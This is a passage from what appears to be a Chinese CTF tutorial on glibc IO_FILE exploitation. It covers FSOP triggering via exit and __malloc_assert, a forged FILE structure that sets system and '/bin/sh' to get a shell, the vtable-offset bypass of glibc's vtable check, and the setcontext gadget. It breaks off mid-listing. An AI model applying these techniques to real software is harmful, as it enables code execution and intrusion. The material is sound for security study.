class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The tag name of this struct is _IO_FILE to preserve historic</span></span><br><span class="line"><span class="comment">   C++ mangled names for functions taking FILE* arguments.</span></span><br><span class="line"><span class="comment">   That name should not be used in new code.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE_complete</code>可以理解为<code>_IO_FILE</code>的豪华加长版，其中的<code>_wide_data</code>需要关注一下，有些手法会用到。</p><h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><p><code>vtable</code>是一个指向<code>_IO_jump_t</code>结构体的指针。当打开一个文件时，相应的 <code>_IO_FILE</code> 结构体会被创建，并将其<code> vtable</code> 字段指向对应文件类型的 <code>_IO_jump_t</code> 结构体的地址。这样，当需要执行文件操作时，可以通过 <code>_IO_FILE</code> 结构体中的 <code>vtable</code> 字段获取到相应的 <code>_IO_jump_t</code> 结构体，并通过其中的函数指针调用相应的文件操作函数。</p><p>通常，一个<code>_IO_jump_t</code> 结构体包含以下函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意，程序中存在很多<code>_IO_jump_t</code>结构体，不同的<code>_IO_FILE_plus</code>可能采用不同的<code>_IO_jump_t</code>，例如stdin&#x2F;stdout&#x2F;stderr使用<code>_IO_file_jumps</code>，可以通过gdb查看</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811182023451.png" alt="image-20230811182023451"></p><h1 id="FSOP基础"><a href="#FSOP基础" class="headerlink" title="FSOP基础"></a>FSOP基础</h1><p><strong>FSOP</strong>(File Stream Oriented Programming是针对<code>_IO_FILE</code>结构体与IO操作的攻击方式</p><p>通常可以分为两个步骤：<strong>劫持</strong>并<strong>伪造</strong>IO结构体、<strong>触发</strong>IO流</p><p>因为触发IO流的方式影响程序进入的IO结构体，所以我们先讲如何触发IO流</p><h2 id="触发IO流"><a href="#触发IO流" class="headerlink" title="触发IO流"></a>触发IO流</h2><p>触发IO流的方式主要分为两种：<strong>FSOP</strong>的经典方式和<strong>house of kiwi</strong>的方式</p><h3 id="FSOP-IO-flush-all-lockp"><a href="#FSOP-IO-flush-all-lockp" class="headerlink" title="FSOP - _IO_flush_all_lockp()"></a>FSOP - _IO_flush_all_lockp()</h3><p>该函数的调用有以下三种触发方式：</p><ol><li><code>libc</code>检测到<strong>内存错误</strong>，从而执行<code>abort</code>函数时（在<code>glibc-2.26</code>删除）</li><li>程序执行<code>exit</code>函数</li><li>程序从main函数返回（同样是执行exit）</li></ol><p>可以看到，高版本下，基本的触发方式都是通过<code>exit</code>函数，其栈回溯为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">_IO_cleanup ()</span><br><span class="line">__run_exit_handlers (status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=run_list_atexit@entry=<span class="number">0x1</span>)</span><br><span class="line">__GI_exit (status=&lt;optimized out&gt;)</span><br></pre></td></tr></table></figure><p>就能调用到<code>_IO_flush_all_lockp()</code>函数</p><p>该函数的代码片段如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"> </span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"> </span><br><span class="line">    fp = fp-&gt;_chain; <span class="comment">//遍历链表</span></span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，在经历一系列条件判断后，程序会调用虚表中的<code>_IO_OVERFLOW</code> 函数，而虚表指针是可以由我们伪造的。所以合理布局，触发该函数，就能进入我们伪造的执行流。</p><p>下面讲如何达成调用<code>_IO_OVERFLOW</code>函数的条件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br></pre></td></tr></table></figure><p>根据短路原则，执行<code>_IO_OVERFLOW</code>需要满足前面的条件为真，这里有一个或语句，故有两种达成条件，满足任一即可：</p><p>1.<br>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p><p>   这是较为常用的达成条件，只需伪造<code>_IO_FILE</code>中的<code>_IO_write_ptr</code>、<code>_IO_write_base</code>和<code>_mode</code>即可达成</p><p>2.<br>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">fp-&gt;_mode &gt; <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p><p>   该条件可以结合<strong>house of cat</strong>使用。其中<code>_IO_vtable_offset (fp) == 0</code> 即 <code>_vtable_offset</code>为0，另外需要关注<code>_wide_data</code>结构体，该手法会在house of cat中讲解</p><p>条件满足后，会从<code>_IO_list_all</code>开始沿着<code>fp -&gt; chain</code>遍历FILE结构体，执行对应虚表中的<code>_IO_OVERFLOW</code>，即<code>&lt;_IO_file_jumps+24&gt;</code></p><h3 id="house-of-kiwi-malloc-assert"><a href="#house-of-kiwi-malloc-assert" class="headerlink" title="house of kiwi - __malloc_assert"></a>house of kiwi - __malloc_assert</h3><p>该手法用于在程序无<code>exit</code>时触发IO，且能控制<code>rdx</code></p><p>以下为<code>__malloc_assert</code>的代码片段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数调用的<code>__fxprintf</code>、<code>fflush</code>都能调用虚表中函数，有劫持的可能。</p><p>以下是进入<code>__malloc_assert</code>的方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>不满足以下条件任一即可进入：</p><ol><li><code>old_size &gt;=MINSIZE</code></li><li><code>old_top.pre_inuse = 0</code></li><li><code>old_top页对齐</code></li></ol><p>通常用的比较多的是第三种，因为页对齐条件较苛刻，通常修改topchunk的size都能不对齐。注意<strong>不能改的太大</strong>，否则会进入别的assert。这里修改的方式一般是构造<strong>堆重叠</strong>或<strong>largebin attack</strong></p><p>接下来讲函数的调用链，这里分<code>__fxprintf</code>和<code>fflush</code>两种方式</p><h4 id="fxprintf"><a href="#fxprintf" class="headerlink" title="__fxprintf"></a>__fxprintf</h4><p>调用链为</p><p><code>__fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; _IO_new_file_xsputn </code></p><p>需要满足的条件为：</p><ol><li><code>_IO_write_ptr</code> &gt; <code>_IO_write_base</code></li><li><code>_lock</code>指向可写地址</li></ol><p>调用后，仅刷新<code>stderr</code>，调用虚表<code>_IO_file_jumps</code>中的<code>_IO_new_file_xsputn</code>，即<code>&lt;_IO_file_jumps+56&gt;</code></p><h4 id="fflush"><a href="#fflush" class="headerlink" title="fflush"></a>fflush</h4><p><code>fflush(stderr) =&gt; _IO_file_jumps =&gt; sync</code></p><p>用的比较少，没什么条件。但是因为在<code>__fxprinf</code>之后，所以需要保证<code>__fxprinf</code>不会挂掉。</p><p>好处是通过这条调用链，在调用<code>sync</code>时的<code>rdx</code>固定，都是<code>IO_helper_jumps</code>，可以结合后面讲到的<code>&lt;setcontext+61&gt;</code>利用。不过高版本中加入虚表检测，这种利用变得困难</p><h2 id="伪造FILE结构体"><a href="#伪造FILE结构体" class="headerlink" title="伪造FILE结构体"></a>伪造FILE结构体</h2><p>如何让我们伪造的FILE结构体在触发IO时被刷新？</p><p>如果使用<strong>FSOP</strong>的方式，程序从<code>_IO_list_all</code>开始沿着<code>fp -&gt; chain</code>遍历。故我们可以修改<code>_IO_list_all</code>指针，指向我们伪造的结构体，如果使用largebin attack就可以一步到位指向布置在chunk上的伪造结构体。同时还可以修改<code>_chain</code>指针，劫持到多个伪造的结构体的利用链</p><p>如果使用<strong>house of kiwi</strong>的方式，程序仅刷新<code>stderr</code>，可以修改<code>stderr</code>指针（如果可写），甚至直接修改<code>_IO_2_1_stderr</code>的内容</p><p>伪造FILE的手法繁多，这里举出最原始的一种手法作为例子</p><h3 id="上古时期的FSOP-Glibc"><a href="#上古时期的FSOP-Glibc" class="headerlink" title="上古时期的FSOP(Glibc&lt;2.24)"></a>上古时期的FSOP(Glibc&lt;2.24)</h3><p>因为触发FSOP时，会调用虚表中<code>&lt;_IO_file_jumps+24&gt;</code>处的<code>__overflow</code>函数，我们只需把该位置填入<code>system</code>的地址。当然，虚表不可写，我们可以将<code>vtable</code>处改为我们伪造的虚表。同时此时的<code>rdi</code>指向FILE结构体的<code>_flags</code>，所以可以将该位置填上<code>/bin/sh</code></p><p>构造方式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr1</span><br><span class="line">chunk_addr1</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="comment">//对应此结构体首地址(fp)</span></span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//一般不用特意设置</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = chunk_addr2</span><br><span class="line">&#125;</span><br><span class="line">chunk_addr2</span><br><span class="line">&#123;</span><br><span class="line">  __dummy = <span class="number">0x0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0x0</span>,</span><br><span class="line">  __finish = <span class="number">0x0</span>,</span><br><span class="line">  __overflow = system_addr,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>干净又卫生</p><h3 id="虚表偏移时代-Glibc-2-24"><a href="#虚表偏移时代-Glibc-2-24" class="headerlink" title="虚表偏移时代(Glibc&gt;&#x3D;2.24)"></a>虚表偏移时代(Glibc&gt;&#x3D;2.24)</h3><p>加入了对虚表的检查<code>IO_validate_vtable()</code>与<code>IO_vtable_check()</code>，若无法通过检查，则会报错：<code>Fatal error: glibc detected an invalid stdio handle</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t * <span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="comment">//检查vtable指针是否在glibc的vtable段中。</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>glibc中有一段完整的内存存放着各个<code>vtable</code>，其中<code>__start___libc_IO_vtables</code>指向第一个<code>vtable</code>地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个<code>vtable</code> <code>_IO_str_chk_jumps</code>结束的地址。若指针不在glibc的<code>vtable</code>段，会调用<code>_IO_vtable_check()</code>做进一步检查，以判断程序是否使用了外部合法的<code>vtable</code>（重构或是动态链接库中的<code>vtable</code>），如果不是则报错。</p><p>2.37以前有以下虚表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_cookie_jumps</span><br><span class="line">_IO_proc_jumps</span><br><span class="line">_IO_str_chk_jumps</span><br><span class="line">_IO_wstrn_jumps</span><br><span class="line">_IO_wstr_jumps</span><br><span class="line">_IO_wfile_jumps_maybe_mmap</span><br><span class="line">_IO_wfile_jumps_mmap</span><br><span class="line">__GI__IO_wfile_jumps</span><br><span class="line">_IO_wmem_jumps</span><br><span class="line">_IO_mem_jumps</span><br><span class="line">_IO_strn_jumps</span><br><span class="line">_IO_obstack_jumps</span><br><span class="line">_IO_file_jumps_maybe_mmap</span><br><span class="line">_IO_file_jumps_mmap</span><br><span class="line">__GI__IO_file_jumps</span><br><span class="line">_IO_str_jumps</span><br></pre></td></tr></table></figure><p>从此，虚表指针不能随意伪造了。好在这个检测依旧比较宽泛，我们依旧可以修改<code>vtable</code>为虚表内的其他指针，通过一定的<strong>偏移</strong>调用<strong>其他虚表</strong>内的函数</p><p>例如，原本house of kiwi会触发<code>&lt;_IO_file_jumps+56&gt;</code>处的<code>_IO_new_file_xsputn</code>函数，我们希望调用<code>&lt;_IO_cookie_jumps+120&gt;</code>处的<code>_IO_cookie_write</code>函数。原本<code>vtable</code>指向<code>_IO_file_jumps</code>，调用函数时则会将指针加上56。我们把<code>vtable</code>设置为<code>&lt;_IO_cookie_jumps+64&gt;</code>，那么在实际调用时，就会调用到<code>&lt;_IO_cookie_jumps+64+56&gt;</code>处的目标函数。这就是<strong>虚表偏移</strong>的思想，将执行流劫持到已有的函数上。</p><h1 id="新时代的高版本IOFILE利用"><a href="#新时代的高版本IOFILE利用" class="headerlink" title="新时代的高版本IOFILE利用"></a>新时代的高版本IOFILE利用</h1><p>高版本下的IOFILE利用方式很多，但大多不外乎都是利用<strong>虚表偏移</strong>的思想伪造FILE结构体，并通过以上的方式<strong>触发IO</strong>，从而getshell或者orw</p><p>这里介绍几种<del>我会的</del>比较好用的</p><h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><p>相较于他的实战意义，kiwi更大的价值可能在于它的两条思路，一条是上文提到的<code>__malloc_assert</code>触发IO，另一条则是<code>setcontext&lt;+61&gt;</code></p><p>这是一个函数的片段，兼具<strong>布置寄存器、栈迁移</strong>的功能，常常在沙盒限制<code>execve</code>的情况下用来打<strong>orw链</strong>，汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x00007fa70ef04a6d &lt;+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">0x00007fa70ef04a74 &lt;+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">0x00007fa70ef04a7b &lt;+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">0x00007fa70ef04a7f &lt;+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">0x00007fa70ef04a83 &lt;+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">0x00007fa70ef04a87 &lt;+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">0x00007fa70ef04a8b &lt;+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">0x00007fa70ef04a8f &lt;+95&gt;:    test   DWORD PTR fs:0x48,0x2</span><br><span class="line">0x00007fa70ef04a9b &lt;+107&gt;:   je     0x7fa70ef04b56 &lt;setcontext+294&gt;#基本上都能跳</span><br><span class="line">---&gt;</span><br><span class="line">0x00007fa70ef04b56 &lt;+294&gt;:   mov    rcx,QWORD PTR [rdx+0xa8]</span><br><span class="line">0x00007fa70ef04b5d &lt;+301&gt;:   push   